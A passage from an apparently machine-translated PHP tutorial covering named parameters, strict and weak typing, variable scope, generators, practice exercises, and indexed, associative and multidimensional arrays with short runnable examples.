  
?>

 

In this example, we have a function called "infos\_display" which takes four parameters: $lastname, $firstname, $age and $isactive. The function then returns the sentence made up of these parameters.

We then call this function and store the returned value in a $person\_info variable before displaying it.

 

If you run this code, you will get a result similar to :

 

![Image](images/image-65.png)

 

But what if, when calling the function, we don't respect the order of the parameters?

 

 

 $person\_info = infos\_display(32, True, "Jean-Marc", "Dupont");  
 echo $person\_info;

 

 

In this example, we've experimented with calling a function with arguments in a different order to its definition. Instead of respecting the order of the function parameters (last name, first name, age, is active), we reversed this order and transmitted the values in a different way: 32 for last name, True for first name, "Jean-Marc" for age and "Dupont" for is active.

In this case, executing the code gives the following result:

 

![Image](images/image-66.png)

 

The result we obtained was incorrect when we displayed the person's information. Instead of getting the expected details, we got an unexpected output. To solve this problem, PHP 8 has introduced the notion of named parameters. In fact, named parameters allow a function to be called with the parameter order reversed.

 

With named parameters, we can explicitly specify the name of each parameter followed by a colon ( **:** ), followed by its value when the function is called. This ensures that each argument is associated with the correct parameter, regardless of the order in which they are passed in the function call. So, even if we reverse the order of the arguments in our function call, the use of named parameters guarantees that the function will correctly process each value according to its associated parameter. Here's how to use named parameters and remedy the problems that can arise when reversing the order of function parameters.

 

<?php  
 function infos\_display($lastname, $firstname, $age, $isactive) {  
 return "Last Name: $lastname, First Name: $firstname, Age: $age, Active: $isactive";  
 }  
 $person\_info = infos\_display(age:32, isactive:True, firstname: "Jean- Marc", lastname: "Dupont");  
 echo $person\_info;  
?>

 

When we execute this code, the result is identical to that obtained when calling the infos\_display() function, respecting the order of the parameters.

###  

![Image](images/image-67.png)

 

### Typing in PHP

 

In PHP, the typing of parameters and function return values can be specified to improve code clarity and guarantee better data integrity. There are two types of typing that can be used in PHP: strict typing and weak typing.

 

Typing Low

 

By default, PHP uses weak typing, meaning that the data types of function parameters and return values are not explicitly declared. This allows great flexibility, but can sometimes lead to errors that are difficult to detect.

 

Example of a function without typing :

 

<?php  
  
 function addition($a, $b) {  
 return $a \+ $b;  
 }  
  
 $result1 \= addition(5,10);  
 echo $result1 ."<br\>";  
  
 $result2 \= addition(5, "10");  
 echo $result2 ."<br\>";  
  
?>

 

This PHP code defines a function named addition that takes two parameters, $a and $b, and returns the sum of these two parameters. The function is then called twice with different arguments.

In this example, the **addition()** function doesn't specify the type of its $a and $b parameters. They can be of any data type, and the function's result will depend on the type of the values passed.

 

In the first call of the function **addition(5, 10)**, the two arguments are integers ($a = 5 and $b = 10). The function returns the sum of these two numbers, which is 15, and this value is then assigned to the variable $result1. Finally, the value of $result1 is displayed, producing 15 on the output.

 

In the second call of the function **addition(5, "10")**, the first argument is an integer ($a = 5), but the second argument is a string ($b = "10"). PHP performs an **automatic** type **conversion** on addition, converting the string "10" into an integer. Consequently, the function also returns 15 (the sum of 5 and 10), and this value is assigned to the variable $result2. Finally, the value of $result2 is displayed, also producing 15 on the output.

 

In summary, the result of both calls to the addition function is the same (15), even though the second call uses a string for the second argument. This is due to the automatic type conversion performed by PHP during the addition operation.

 

### Strict typing

Strict typing, introduced with PHP 7, makes it possible to explicitly specify the data types of parameters and function return values. This allows type inconsistencies to be detected as early as the development phase, which can help reduce errors.

 

To enable strict typing, you must declare the declaration: **declare(strict\_types=1);** at the beginning of your PHP script:

 

![Image](images/image-68.png)

 

To declare the type of parameters, simply specify the desired type in front of each parameter, and to specify the type of value returned by a function, simply addition a colon (:) after the list of parameters, followed by the expected return type.

 

Let's modify the previous example by specifying the parameter types and the output type:

 

<?php  
 declare(strict\_types\=1);  
  
 function addition(int $a, int $b): int {  
 return $a + $b;  
 }  
  
 $result1 = addition(5,10);  
 echo $result1 ."<br>";  
  
 $result2 = addition(5, "10");  
 echo $result2 ."<br>";  
  
?>

 

If you run this code, you will get a result similar to :

 

![Image](images/image-69.png)

 

The result first displays the number 15, which corresponds to the value of variable $result1. When we call the function addition(5,10);, we pass two integers, which is consistent with the declared types. Consequently, the function additions these two integers and returns an integer result stored in variable $result1, which is then displayed.

 

However, in the following call addition(5, "10");, we pass an integer and a string, which does not correspond to the declared type **int**. As **strict** typing is enabled, this generates a fatal error, as the data type supplied does not match the type expected by the function. As a result, the script stops and displays an error rather than automatically converting the string to an integer, as would be the case in the absence of strict typing.

 

Finally, note that from PHP 8 onwards, you can specify multiple types for the same parameter using the new type union operator **|**(vertical bar). This allows you to define that a parameter can accept several different data types. For example, if a parameter can be either an integer or a string, you can declare it as follows: 

 

 

<?php

  
 function example(int|string $parameter1, float|int $parameter2) {  
 // Body of function  
 }  
  
?>

 

In this example, $parameter1 can be either an integer or a string. As for $parameter2, it can be either a decimal number or an integer. This offers greater flexibility when defining parameter types for functions.

 

## Scope of variables

Variable scope is a fundamental concept in programming that determines where a variable can be used in a PHP script. Understanding the scope of variables is essential for writing well-structured code, avoiding logic errors and ensuring that our programs run smoothly.

 

In PHP, variables can have different scopes depending on their location in the script. Some variables can be accessed from anywhere in the script, while others are restricted to specific parts of the code.

 

In this section, we'll explore the different types of variable scope in PHP, how they're defined and used, and best practices for handling them effectively. We'll also look at common pitfalls associated with variable scoping and how to avoid them.

 

Let's start by taking a look at the main concepts behind variable scoping in PHP and how they affect the way we write our code.

 

### Global Scope

 

In PHP, variables declared outside any function have global scope. This means they can be accessed from anywhere in the PHP script, both inside and outside functions.

 

When a variable is declared outside any function, it automatically becomes a global variable. For example :

 

  
<?php  
 $global\_variable = "I am a global variable";  
 function display\_global\_variable() {  
 global $global\_variable;  
 echo $global\_variable;  
 }  
  
 display\_global\_variable(); // Call function  
  
?>

 

 

In this example, **$global\_variable** is a global variable because it is declared outside any function. It can be used inside the display\_global\_variable() function, but only if the **global** keyword is used.

 

It's important to note that the use of global variables can make code less readable and more difficult to maintain, as they can be modified unpredictably at different points in the script. It is therefore recommended to limit the use of global variables.

Executing this code displays the result:

 

![Image](images/image-70.png)

 

**Warning**: if you try to use a global variable inside a function without declaring it with the global keyword:

 

<?php  
 $global\_variable = "I am a global variable";  
 function display\_global\_variable() {  
 echo $global\_variable;  
 }  
  
 display\_global\_variable(); // Call function  
  
?>

 

In this case, you'll get an error similar to the following message:

 

![Image](images/image-71.png)

 

### Local scope

 

In local scope, variables are declared inside a function and can only be accessed within that function. These variables exist only as long as the function is running, and are destroyed as soon as the function ends. This means they cannot be used outside the function in which they are declared. This limitation of scope helps avoid variable name conflicts between different parts of the code.

 

The following example illustrates the local scope of variables:

 

<?php  
 function displayMessage() {  
 $message \= "Hello, world!";  
 echo $message;  
 }  
  
 displayMessage(); // Displays "Hello, world!"

  
 echo $message; // Attempt to access variable $message  
  
?>

 

In this example, the $message variable is declared inside the displayMessage() function, making it local to this function. This $message variable cannot be accessed outside the function where it is defined. When we try to display the value of this variable outside the function, an error is generated, indicating that the $message variable is not recognized at this point in the code.

 

![Image](images/image-72.png)

 

This demonstration highlights the local scope of variables in PHP. Local variables are restricted to the function in which they are declared, and cannot be used outside that function. This helps avoid naming conflicts and makes code more modular and organized.

 

Static range

 

A local variable, created inside a function, is automatically destroyed at the end of the function's execution. However, in some cases, we may need to retain the value of this variable between successive calls to the function in order to use it at a later date, hence the notion of static scope.

Static variable scoping in PHP allows a variable to retain its value between successive function calls. Unlike local variables, which are created and destroyed with each function call, static variables retain their value even after the function has been exited.

 

Consider the following example:

 

<?php  
 function counter() {  
 $counter \= 0;  
 $counter++;  
 echo "Number of function calls : $counter <br\>";  
 }  
 counter();  
 counter();  
 counter();  
?>

 

In this example, we have a function called "counter()" which initializes a local variable called "$counter" to zero each time the function is called. It then increments this variable by 1 on each call, and displays the total number of function calls at that time. However, as the "$counter" variable is redefined each time the function is called and is local to the function, it is reset to zero each time. Consequently, each time the function is called, the number of calls displayed will always be "1".

 

![Image](images/image-73.png)

 

This highlights the fact that the scope of local variables in a function is limited to the specific call of that function, and that local variables are automatically destroyed once the function call is completed.

 

In some cases, however, we may need to retain the value of this variable between successive function calls. To do this, simply declare the variable $counter with the keyword **static :**

 

<?php  
  
 function counter() {  
 static $counter \= 0;  
 $counter++;  
 echo "Number of function calls : $counter <br\>";  
 }  
  
 counter();  
 counter();  
 counter();  
?>

 

In this example, the $counter variable is declared as **static** inside the counter() function, using the **static keyword**. Each time the counter() function is called, the $counter variable is incremented by 1 and its value is **retained** between successive calls to the function. In this way, each call displays the total number of function calls, which is incremented with each call.

 

![Image](images/image-74.png)

 

In short, variable scope in PHP is an essential concept that determines where and when a variable can be used in a script. In the foregoing, we've looked at three types of variable scope: global, local and static. Understanding these different scopes is crucial to writing robust, maintainable code. Let's now take a look at a summary of each of these scope types.

 

Global Scope :

 

*   Variables declared outside any function are considered global variables.
*   They can be used inside any function using the **global** keyword.
*   Their scope extends to the entire PHP script.
*   Changes made to a global variable inside a function are also visible outside the function.

 

Local scope :

 

*   Variables declared inside a function are considered local variables.
*   They can only be accessed within the function where they have been declared.
*   Local variables are destroyed (deallocated) as soon as the function in which they were declared ends.
*   Local variables can have the same name as global variables, but they have a local scope and do not modify global variables of the same name.

 

Static range :

 

*   Static variables are declared inside a function with the **static** keyword.
*   Unlike ordinary local variables, static variables are not destroyed at the end of function execution.
*   The value of a static variable is retained between successive function calls.
*   Each subsequent call to the function retains the value of the static variable as it was left at the end of the previous call.
*   Static variables allow you to store information between function calls without using global variables, thus offering a degree of persistence in local variable values.

 

![Image](images/image-75.png)

##  

## Generators: A special type of function

Generators in PHP are special functions that allow you to create custom iterators efficiently and concisely. Unlike traditional functions that return a value and then terminate, generators can suspend execution at a certain point while retaining their internal state. This means they can produce a sequence of values over time, making them particularly useful for processing large quantities of data or generating infinite sequences.

The syntax for defining a generator is similar to that of a normal function, but instead of using the **return** keyword to return a value, we use the **yield** keyword. Here's a simple example of a generator that produces a sequence of even numbers:

 

<?php  
  
 function generate\_even\_numbers($max) {  
 for ($i = 0; $i <= $max; $i += 2) {  
 yield $i;  
 }  
 }  
  
?>

 

In this example, the function generate\_even\_numbers() is a generator that produces a sequence of even numbers up to a given maximum. When this function is called, it doesn't immediately start executing its code. Instead, it returns a generator object that can be iterated using a foreach loop or other iteration methods.

 

Here's how to use this generator to display even numbers up to 17:

 

 

<?php  
  
 function generate\_even\_numbers($max) {  
 for ($i = 0; $i <= $max; $i += 2) {  
 yield $i;  
 }  
 }  
  
  
 foreach (generate\_even\_numbers(17) as $number) {  
 echo $number . " ";  
}  
  
?>

 

This code will produce: 0 2 4 6 8 10 12 14 16 :

 

![Image](images/image-76.png)

 

Here is a simpler example of a generator that generates a sequence of integer numbers belonging to a given interval:

 

  
<?php  
  
 function generate\_even\_numbers2($min, $max) {  
 for ($i = $min; $i <= $max; $i++) {  
 yield $i;  
 }  
 }  
  
 // Use the generator to display a sequence of numbers  
 foreach (generate\_even\_numbers2(21, 35) as $number) {  
 echo $number . " ";  
 }  
  
?>

 

This code will produce the following result:

 

![Image](images/image-77.png)

 

### Generator delegation

 

Generator delegation is an advanced concept that allows one generator to call another generator to obtain values. This makes it possible to decouple the value generation logic and reuse existing generators in new generators.

 

Here is an example of generator delegation:

 

Suppose we have two generators, one generating even numbers and the other generating odd numbers. We can create a third generator that uses these two generators to generate a sequence of even and odd numbers.

 

  
<?php

  
 // First even number generator  
 function generate\_even\_numbers($max) {  
 for ($i = 0; $i <= $max; $i += 2) {  
 yield $i;  
 }  
 }  
  
 // Second odd number generator  
 function generate\_odd\_numbers($max) {  
 for ($i = 1; $i <= $max; $i += 2) {  
 yield $i;  
 }  
 }  
  
 // Third generator calling the 2 previous generators  
 function generate\_even\_odd\_numbers($evenmax, $oddmax) {  
 yield from generate\_even\_numbers($evenmax);  
 yield from generate\_odd\_numbers($oddmax);  
 }  
  
 // Use the generator to display a sequence of even and odd numbers  
 foreach (generate\_even\_odd\_numbers(20, 30) as $number) {  
 echo $number . " ";  
 }  
  
?>

 

This code defines three number generators: generate\_even\_numbers(), generate\_odd\_numbers() and generate\_even\_odd\_numbers().

The first generator, **generate\_even\_numbers()**, generates a sequence of even numbers up to a specified maximum value. The second generator, **generate\_odd\_numbers()**, generates a sequence of odd numbers up to a specified maximum value.

 

The third generator, **generate\_even\_odd\_numbers(),** uses generator delegation (using the **yield from** keyword) to call the previous two generators and generate an alternating sequence of even and odd numbers up to the maximum values specified for each generator.

 

Next, the code uses the generator **generate\_even\_odd\_numbers()** to display a sequence of numbers up to 20 for even numbers and up to 30 for odd numbers. This is achieved using a foreach loop that iterates through the values generated by the generator and displays them on the screen.

 

Executing this code will produce the following result:

 

![Image](images/image-78.png)

 

## Conclusion

PHP functions are essential programming elements that enable code to be grouped together, making it reusable and modular. They offer an efficient way of organizing and structuring code, making maintenance and project management easier. We've explored various aspects of functions, including their declaration, calling, parameter management and variable scope, as well as more advanced concepts such as typing and named parameters.

 

Understanding how functions work and how to use them appropriately is crucial for any PHP developer, as it enables the creation of more robust, scalable and easy-to-maintain applications. By mastering the concepts presented in this chapter, you'll be able to write cleaner, more modular and more efficient code, which will significantly improve your productivity as a PHP developer.

 

 

## EXERCISES

 

### Exercise 12

 

Write a function that tests whether a number is a multiple of 3 and displays a message according to the result of this test.

 

### Exercise 13

 

Write a PHP function that takes three numbers as input and returns the largest of these three numbers.

 

### Exercise 14

 

Write a function to display the random number needed to find a two-digit integer given as a parameter.

# Chapter 5

# Tables in PHP

 

 

Arrays play an essential role in programming, offering a powerful and flexible way of organizing and manipulating data sets. In PHP, arrays are versatile data structures that can contain an ordered collection of elements of different types, such as numbers, strings and even other arrays. This chapter explores arrays in PHP in detail, from their declaration and initialization to their advanced manipulation using predefined functions. Mastering arrays is essential for creating dynamic, high-performance Web applications.

 

An array in PHP is a data structure that allows you to store several values in a single variable. These values can be of various types, such as integers, strings, Booleans and so on. Each value in an array is associated with a key, which may be numeric or a string, depending on the array type.

 

In PHP, there are several types of array. Let's explore the world of arrays in PHP and discover all they have to offer!

 

![Image](images/image-79.png)

 

 

## Indexed tables (numbered)

Indexed arrays, also known as numbered arrays, are data structures where each element is associated with a numerical index. These indices generally start at zero and increment by 1 for each additional element. Indexed arrays are one of the simplest forms of arrays in PHP and are widely used to store ordered collections of data.

 

In this section, we'll explore how to declare, initialize, and manipulate indexed arrays in PHP. We'll also discover common operations such as adding, modifying, deleting, and traversing the elements of an indexed array. By understanding these fundamental concepts, you'll be well-equipped to work efficiently with indexed arrays in your PHP projects.

 

### Declaration and initialization of an indexed array

 

In PHP, you can declare and initialize an indexed array in a number of ways. Here are a few examples:

 

 

<?php

 

 // Declaration of an empty indexed array  
 $empty\_array = \[\];

  
 // Declaration and initialization of an indexed array with values  
 $numbers \= \[10, 20, 30, 40, 50\];  
  
 // Declaration of an array indexed with the array() function  
 $lastnames \= array("Emma", "Alice", "Lina", "Sarah", "Thomas");

 

?>

 

In this example, we have defined three types of array declarations:

 

The first declaration: **$empty\_array = \[ \];** declares an empty indexed array named **$empty\_array**. Empty square brackets \[ \] are used to create a new empty array in PHP.

 

The second statement:

**$numbers = \[10, 20, 30, 40, 50\];** declares and initializes an indexed array named **$numbers** with the values \[10, 20, 30, 40, 50\]. Values are separated by commas and enclosed in square brackets \[ \].

The third statement:

 

**$lastnames= array("Emma", "Alice", "Lina", "Sarah", "Thomas");** declares an indexed array named **$lastnames** using the **array()** function. The array() function creates an array by specifying the values as arguments in brackets. Values are separated by commas and enclosed in parentheses **( )**.

 

In summary, these indexed array declarations show different ways of creating and initializing indexed arrays in PHP, whether using empty brackets \[\] or the array() function.

 

### Accessing the elements of an indexed array

 

To access a specific element of an indexed array, you use its corresponding numerical index, starting with 0. Here's the syntax:

 

![Image](images/image-80.png)

 

In the above example, if you wish to access the elements of the **numbers** array, for example, simply use their indexes, bearing in mind that the first element always has 0 as its index:

 

<?php  
  
 $numbers \= \[10, 20, 30, 40, 50\];

  
 echo $numbers\[0\]."<br\>";  
 echo $numbers\[1\]."<br\>";  
 echo $numbers\[2\]."<br\>";  
 echo $numbers\[3\]."<br\>";  
 echo $numbers\[4\]."<br\>";  
  
?>

 

If you execute this code you will get the following result:

 

![Image](images/image-81.png)

 

### Adding elements to an indexed array

 

To addition new elements to an indexed array, simply assign a value to a new index. PHP will automatically take care of the correct indexing. Here's an example of how to addition new elements to the $numbers and $name arrays in the previous example:

 

<?php  
 // Declaration and initialization of an array indexed with values  
 $numbers = \[10, 20, 30, 40, 50\];  
  
 // Declaration of an array indexed with the array() function  
 $lastnames = array("Emma", "Alice", "Lina", "Sarah", "Thomas");  
  
 $numbers\[\] = 60; // Addition 60 to the end of the array  
 $lastnames\[5\] = "Eve"; // Addition "Eve" to index 5 of array  
?>

 

After executing this code, the arrays $numbers and $names become :

 

**$numbers** \= \[10, 20, 30, 40, 50, **60**\] 

**$lastname** \= \["Emma", "Alice", "Lina", "Sarah", "Thomas", "**Eve**"\]

 

### Editing and deleting elements

 

To modify an existing element in an indexed array, you can access the element by its index and assign it a new value. To delete an element, you can use the **unset()** function.

 

Example:

 

If you want to modify the $number array in the previous example by replacing element 20 with 100, simply addition the line of code :

 

 // Modify the second element by replacing it with 100

 $numbers\[1\] = 100; // The element to be modified has index 1

 

If you want to delete the "Sarah" element from the $lastname array, simply use the predefined **unset()** function in PHP :

 

 unset($lastnames\[3\]); // Deletes the fourth element (Sarah)

 

### Browse an indexed table

 

To browse an indexed array in PHP, you can use various flow control structures, such as the **for** loop, which we studied in a previous chapter, or the **foreach** loop, which we'll look at next. 

 

Loop for :

The for loop is used when you know in advance the number of elements in the array. You can iterate over each element of the array using an index. To find out the number of elements in an array, PHP provides a function called **count()**, which returns the number of elements in an array passed as an argument.

 

Example:

 

<?php  
  
 $numbers \= \[10, 20, 30, 40, 50\];  
 $length \= count($numbers);  
  
 for ($i \= 0; $i < $length; $i++) {  
 echo $numbers\[$i\] . "<br\>";  
 }  
  
?>

 

In this example, we have an indexed array called $numbers containing five elements: 10, 20, 30, 40 and 50. The **count()** function is used to obtain the total number of elements in the array, which is stored in the **$length** variable.

 

Next, a for loop is used to iterate through each element of the array using an index. The variable **$i** is initialized to **0**, and the loop continues as long as the value of $i is less than $length. At each iteration, the value of the array element at index $i is displayed with echo, followed by a <br> tag to create a line break in the HTML rendering. Execution of this code displays the following result:

 

![Image](images/image-82.png)

 

The for loop works perfectly for browsing this type of array, and its use is entirely appropriate. However, we'll now turn to another loop specifically designed for arrays: the foreach loop.

 

### Foreach loop

 

The foreach loop is used when you want to iterate over each element of the array without worrying about knowing the size of the array in advance. The **foreach** loop admits two different syntaxes, the first syntax we use to traverse an indexed array is :

 

![Image](images/image-83.png)

In this syntax, the $value variable directly contains the value of each element of the $table array during iteration. The element key is not accessible in this form of the foreach loop. This foreach loop syntax allows you to iterate through the elements of an array on values only, without needing to retrieve the keys associated with each value. Each time the loop is iterated, the $value variable contains the value of the currently traversed element in the array. This simplifies the process of traversing arrays when only the value of elements is required, without worrying about the associated keys.

 

Example:

 

<?php  
  
 $numbers = \[10, 20, 30, 40, 50\];  
 foreach ($numbers as $number) {  
 echo $number . "<br>";  
 }  
  
?>

 

This example uses the **foreach** loop to traverse the $numbers array. In this loop, **$number** (singular) represents each element of the **$numbers** array at each iteration. In fact, at each iteration, the **$number** variable takes on the value of the **current** element in the array. So, on each loop turn, the value of $number is displayed, followed by a <br> tag for a line feed. This loop is handy for browsing through all the elements of an array without needing to explicitly manage an index as with the for loop. The output result of this code is exactly the same as that obtained with the for loop.

## Associative arrays

Associative arrays, as their name suggests, associate keys with values. Unlike indexed arrays, where values are accessible by their numerical position, in an associative array, values are accessible by their associated key. Here's how to declare and initialize an associative array in PHP :

 

### Declaration of an empty associative array

 

The method for declaring an empty associative array is the same as for declaring an indexed array:

 

<?php  
  
 $empty\_associative\_array = \[\];  
  
?>

 

In this example, we declare and initialize an empty associative array using PHP's array syntax. The variable $empty\_associative\_array is assigned to an empty associative array using empty double square brackets, i.e. an array that contains no key-value pairs.

This declaration creates an empty associative array that can be used to store data by associating keys with values later in the code.

 

### Declaring and initializing an associative array with values

 

Associative arrays work on the same principle as indexed arrays, except that each key is associated with a distinct name rather than a number. Let's take the example of the array illustrated in the following figure. How can we declare and initialize this array in PHP?

 

![Image](images/image-84.png)

 

The syntax used to declare and initialize the $person associative array is as follows:

 

<?php  
 $person = \[  
 "last\_name" => "Dupont",  
 "first\_name" => "Amine",  
 "age" => 29,  
 "gender" => "M",  
 "country" => "France"  
 \];  
?>

 

In this example, we initialize an associative array **$person** using PHP's associative array syntax. 

This syntax uses square brackets \[ \] to delimit the beginning and end of the associative array. Inside the square brackets, each element of the array is a **key-value** pair, where the key is followed by the **\=>** sign and the value associated with that key. Key-value pairs are separated by commas. This syntax allows you to create an associative array where each key is associated with a specific value.

 

The keys "last\_name", "first\_name", "age", "gender" and "country" are associated with their respective values: "Dupont", "Amine", 29, "M" and "France" using the **\=>** sign. This table stores information about a person, such as surname, first name, age, gender and country. Keys are used to access the corresponding values in the table.

###  

### Declaring an associative array with the array() function

 

The third way to declare an associative array is to use PHP's predefined **array()** function:

 

<?php  
  
 $grades = array(  
 "Maths" => 15,  
 "Physics" => 18,  
 "English\_language" => 12  
 );  
  
?>

 

In this example, we initialize an associative array $grades using the **array()** function. This syntax begins with the array() keyword, followed by a list of key-value pairs. Each pair is defined by specifying the key followed by the => sign and the value associated with that key. Key-value pairs are separated by commas. This syntax allows you to create an associative array where each key is associated with a specific value.

 

The $grades array therefore contains three elements: "Maths" associated with note 15, "Physics" associated with note 18, and "English\_language" associated with note 12. Keys are used to access the corresponding values in the table.

 

### Accessing elements in an associative array

 

To access a specific element in an associative array, we use the corresponding key in square brackets.

For example, to access the "first\_name" element in the $person associative array, we use $person\["first\_name"\].

If you addition the following line of code to your script, you'll retrieve and display the first name: "Amine".

 

 

 echo $person\["first\_name"\]; //retrieves and displays the first name: Amine

 

 

To access the Maths score in the $grades array, we use $grades\["Maths"\].

 

 

 echo $grades\["Maths"\]; //retrieve and display the Maths grade: 15

 

 

### Adding elements to an associative array

 

We can addition new elements to an associative array by assigning a value to a new key.

For example, to addition the element "**email**" with the value "amine.dupont@example.com" to the associative array $person, we use :

 $person\["email"\] = "amine.dupont@example.com";

 

 $person\["email"\] = "amine.dupont@example.com";

 

To display all the elements of an array, we can use the **print\_r()** function, predefined in PHP:

 

<?php

  
 $person = \[  
 "last\_name" => "Dupont",  
 "first\_name" => "Amine",  
 "age" => 29,  
 "gender" => "M",  
 "country" => "France"  
 \];  
  
 $person\["email"\] = "amine.dupont@example.com";  
 echo "<pre>";  
 print\_r($person);  
 echo "</pre>";  
?>

 

In this code, we have an associative array named $person with five key-value pairs representing different information about a person: last name, first name, age, gender, and country. Next, a new "email" key with the value "amine.dupont@example.com" is added to the array using the syntax $person\["email"\] = "amine.dupont@example.com";.

 

The **print\_r()** function is used to display the contents of the $person array. By wrapping this function with the HTML tags **<pre>** and **</pre>**, the result is displayed in a formatted, more readable way in the browser.

 

As shown in the figure below, the result of running this code will display the full contents of the $person array, including the newly added "email" key, with all key-value pairs in a readable format.

 

![Image](images/image-85.png)

 

 

### Modifying elements in an associative array

 

To change the value of an element in an associative array, we simply reassign a new value to the corresponding key.

For example, to change the age of the person in the $person associative array, we use :

 

 

 $person\["age"\] = 40;

 

 

After executing this line of code, the value of the "age" element in the $person array becomes 40.

 

### Deleting elements from an associative array

 

To delete a specific element from an associative array, we use the **unset()** function, predefined in PHP, with the key of the element we want to delete.

For example, to delete the "gender" element from the $person associative array, we use :

 

 

 unset($person\["age"\]);

 

 

### Browse an associative table

 

Associative arrays are data structures where each element is associated with a key rather than a numerical index. This allows values to be accessed using explicit keys rather than numerical indexes.

 

Here are some methods for browsing an associative array:

 

Using the foreach loop :

 

The foreach loop is a particularly effective tool for browsing associative arrays. It allows you to navigate easily through each key-value pair in the array. We've already seen its use with indexed arrays. Now let's explore how to use this loop with associative arrays. Here's the second syntax of the foreach loop:

 

 

![Image](images/image-86.png)

In this syntax we have:

 

*   **$table** : represents the table to be browsed.
*   **$key**: represents the key of the current element in the array.
*   **$value**: represents the value of the current element in the array.

The **foreach** loop iterates through each element of the array, assigning the key and value of each element to the variables $key and $value, respectively. The instructions inside the loop are executed for each element of the array.

 

Here's an example:

 

<?php

  
 $person = \[  
 "last\_name" => "Dupont",  
 "first\_name" => "Amine",  
 "age" => 29,  
 "gender" => "M",  
 "country" => "France"  
 \];  
  
 foreach ($person as $key => $value) {  
  
 echo "Key: $key, Value: $value <br>";  
}  
  
?>

 

In this example, we have an associative array called $person that we created earlier.

 

The **foreach** loop is used to traverse the $person array. With each iteration of the loop, the **key** and **value** of each element in the array are stored in the **$key** and $value variables respectively.

 

Within the foreach loop, we display the key and value of each element in the array using the echo function. The key is displayed using the $key variable and the value is displayed using the **$value** variable.

 

So, for each element of the $person array, this loop displays the corresponding key followed by its value, separated by a comma, then followed by a line break for better readability in the browser.

 

Result:

 

![Image](images/image-87.png)

 

## Multidimensional tables

Whereas simple arrays store simple data (numbers, strings etc.) in a linear fashion, multidimensional arrays are a complex data structure where each element can be an array itself. These arrays are useful for representing tabular data, matrices or other more complex data structures requiring multiple levels of organization. Take, for example, the multi-dimensional array shown in the following figure. This table shows the capital and population of France, Canada, Morocco and Spain.

 

![Image](images/image-88.png)

 

By analyzing the structure of this multidimensional table, we can deduce that it is structured as a list of countries, where each country is represented by a sub-table containing three elements: the name of the country, its capital and the number of inhabitants.

Here's how each element is organized in the table:

 

*   The first element of each sub-table is the country name.
*   The second element is the country's capital.
*   The third element is the number of inhabitants in the country.

 

In this way, each sub-table represents a country with its associated characteristics, and all these sub-tables are grouped together in a main table to form the complete multi-dimensional array. There are several methods for declaring and initializing this array in PHP.

 

**Method 1**: Use the **array()** function to create an array.

 

<?php  
  
 $info\_country \= array(  
 array("France", "Paris", 67),  
 array("Canada", "Ottawa", 38),  
 array("Morocco", "Rabat", 40),  
 array("Spain", "Madrid", 47)  
 );  
  
?>

 

Method 2: Using bracket notation \[ \].

 

<?php  
  
 $info\_country \= \[  
 \["France", "Paris", 67\],  
 \["Canada", "Ottawa", 38\],  
 \["Morocco", "Rabat", 40\],  
 \["Spain", "Madrid", 47\]  
 \];  
  
?>

 

These two methods are equivalent and produce the same result. They both define a multi-dimensional array containing four sub-arrays, each representing a country with its associated information (name, capital, number of inhabitants). The only difference lies in the syntax used: the first method uses the array() function, while the second uses PHP's shortened array syntax, introduced with the square bracket notation **\[ \]**.

 

Each element of the **main** table is an indexed table containing information for a specific country and represents one row of the table illustrated above. The first element of each table represents the country name, the second element represents the capital and the third element represents the number of inhabitants.

To visualize the structured contents of this table and better understand its layout, we can use the **print\_r()** function by surrounding it with the HTML <pre> tag:

 

<?php  
  
 $info\_country \= array(  
 array("France", "Paris", 67),  
 array("Canada", "Ottawa", 38),  
 array("Morocco", "Rabat", 40),  
 array("Spain", "Madrid", 47)  
 );  
  
 echo "<pre\>";  
 print\_r($info\_country);  
 echo "</pre\>";  
?>

 

When this code is executed, the result displayed will be similar to the following. This result clearly illustrates the structure of the multi-dimensional array. The main array is represented by the first "Array ( )", containing four sub-arrays indexed from 0 to 3. Each of these sub-arrays contains three elements indexed from 0 to 2.

 

![Image](images/image-89.png)

### Accessing the elements of a multidimensional array

 

If we take the example of the multidimensional array $info\_country, to access its elements, you can use numerical indexes, then their individual elements. For example, to access the capital of France, you can use the following syntax:

 

 // Access to the capital of France  
 $capital\_france \= $info\_country\[0\]\[1\];  
 echo $capital\_france; // Display "Paris".

 

In this example, $info\_country\[0\] returns the first sub-table corresponding to France, and $info\_country\[0\]\[1\] accesses the second element of this sub-table, which is the capital (Paris).

 

For example, to access the number of inhabitants of Morocco, you can use the following syntax:

 

 // Access to the number of inhabitants in Morocco  
 $capital\_france \= $info\_country\[2\]\[2\];  
 echo $capital\_france; // Display 40

 

In this example, $info\_country\[2\] returns the third sub-table corresponding to Morocco, and $info\_country\[2\]\[2\] accesses the third element of this sub-table, which is the number of inhabitants of Morocco.

 

### Two-dimensional associative array

 

In the $country table example, both rows and columns are indexed, which can sometimes make the designation of elements ambiguous. To remedy this, instead of using indices for the columns, we can use keys for better readability and a more intuitive understanding of the table.

 

![Image](images/image-90.png)

To declare and initialize this array in PHP, we can use the **bracket** notation **\[ \]** or the **array()** function:

 

Method 1:

 

$country\_information \= array(  
 array("country" => "France", "capital" => "Paris", "inhabitants" => 67),  
 array("country" => "Canada", "capital" => "Ottawa", "inhabitants" => 38),  
 array("country" => "Morocco", "capital" => "Rabat", "inhabitants" => 40),  
 array("country" => "Spain", "capital" => "Madrid", "inhabitants" => 47)  
);

 

 

Method 2:

 

  
 $country\_information =\[  
 \["country" => "France" , "capital" => "Paris" , "inhabitants" => 67\],  
 \["country" => "Canada" , "capital" => "Ottawa" , "inhabitants" => 38\],  
 \["country" => "Morocco" , "capital" => "Rabat" , "inhabitants" => 40\],  
 \["country" => "Spain" , "capital" => "Madrid" , "inhabitants" => 47\]  
 \];  
 

 

Both methods, using the abbreviated syntax **\[...\]** and the **array()** function**,** are equivalent in terms of result. They both create a multi-dimensional array with the same data. The main difference lies in the syntax used:

 

Abbreviated syntax \[...\] is more concise and modern, often preferred for its enhanced readability.

The array() function is older and more verbose, but it's still widely used and may be necessary in certain situations, particularly when constructing arrays dynamically.

In short, both methods are valid and can be used according to coding preferences and specific project needs.

 

The two codes each define a multi-dimensional array named $country\_information. Each element of this array is itself an associative array containing information on a specific country. Each sub-array associates a key (country, capital, inhabitants) with a corresponding value (France, Paris, 67 for the first sub-array, etc.). So, $country\_information is a collection of associative arrays, each representing information on a particular country.

 

To access the elements of a multidimensional array of this type, we use numerical indices to access the upper array levels, followed by associative keys to access the inner elements.

For example, to access the capital of the first country, use :

 

 

 echo $country\_information\[0\]\["capital"\]; // Displays "Paris".

 

 

Similarly, to access the number of inhabitants in the third country :

 

 

 echo $country\_information\[2\]\["inhabitants"\]; // Display 40

 

 

